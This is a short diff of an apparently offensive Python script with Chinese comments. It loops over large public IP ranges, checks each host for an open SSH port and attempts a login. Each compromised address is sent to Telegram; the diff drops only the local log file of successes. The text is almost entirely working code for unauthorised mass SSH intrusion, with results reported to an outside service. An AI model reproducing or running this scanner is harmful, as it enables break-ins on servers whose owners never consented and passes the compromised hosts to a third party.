@@ -73,24 +73,19 @@ def main():
         ('54.150.0.0', '54.255.255.255')
     ]
 
-    output_file = 'successful_logins.txt'
-
-    # 打开文件来记录登录成功的IP
-    with open(output_file, 'a') as f:
-        for start_ip, end_ip in ip_ranges:
-            ip_list_to_check = ip_list_in_range(start_ip, end_ip)
-            for ip in ip_list_to_check:
-                # 1. 检查22端口是否开放
-                if check_port(ip):
-                    # 2. 如果端口开放，尝试SSH登录
-                    if try_ssh_login(ip):
-                        print(f"成功登录到 {ip}")
-                        send_message_to_telegram(ip)
-                        f.write(f"{ip}\n")
-                    else:
-                        print(f"登录失败: {ip}")
+    for start_ip, end_ip in ip_ranges:
+        ip_list_to_check = ip_list_in_range(start_ip, end_ip)
+        for ip in ip_list_to_check:
+            # 1. 检查22端口是否开放
+            if check_port(ip):
+                # 2. 如果端口开放，尝试SSH登录
+                if try_ssh_login(ip):
+                    print(f"成功登录到 {ip}")
+                    send_message_to_telegram(ip)
                 else:
-                    print(f"IP {ip} ping null")
+                    print(f"登录失败: {ip}")
+            else:
+                print(f"IP {ip} ping null")
 
 if __name__ == "__main__":
     main()
